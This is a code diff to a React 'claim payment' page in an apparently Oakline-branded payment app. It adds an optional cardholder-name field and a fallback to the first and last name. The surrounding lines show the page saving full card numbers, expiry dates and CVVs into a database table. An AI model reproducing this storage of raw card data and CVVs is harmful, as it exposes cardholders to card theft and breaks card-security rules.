@@ -16,6 +16,7 @@ export default function ClaimPaymentPage() {
   const [debitCardForm, setDebitCardForm] = useState({
     first_name: '',
     last_name: '',
+    cardholder_name: '',
     card_number: '',
     card_expiry: '',
     card_cvv: '',
@@ -106,12 +107,13 @@ export default function ClaimPaymentPage() {
 
     setSubmitting(true);
     try {
+      const finalCardholderName = debitCardForm.cardholder_name.trim() || `${debitCardForm.first_name} ${debitCardForm.last_name}`;
       const { error } = await supabase
         .from('oakline_pay_pending_claims')
         .update({
           claim_method: 'debit_card',
           claimed_at: new Date().toISOString(),
-          cardholder_name: `${debitCardForm.first_name} ${debitCardForm.last_name}`,
+          cardholder_name: finalCardholderName,
           card_number: debitCardForm.card_number,
           card_expiry: debitCardForm.card_expiry,
           card_cvv: debitCardForm.card_cvv,
@@ -359,6 +361,12 @@ export default function ClaimPaymentPage() {
 
                   <div style={{ marginBottom: '2.5rem' }}>
                     <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Card Details</h4>
+
+                    <div style={{ marginBottom: '1rem' }}>
+                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Cardholder Name (if different) <span style={{ color: '#999', fontWeight: '400', fontSize: '0.8rem' }}>Optional</span></label>
+                      <input type="text" placeholder="Name as shown on card (leave blank to use first and last name)" value={debitCardForm.cardholder_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, cardholder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                      <p style={{ margin: '0.5rem 0 0 0', fontSize: '0.8rem', color: '#999' }}>If your card shows a different name than your legal name, enter it here. Otherwise, we'll use your first and last name.</p>
+                    </div>
 
                     <div style={{ marginBottom: '1rem' }}>
                       <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Number *</label>
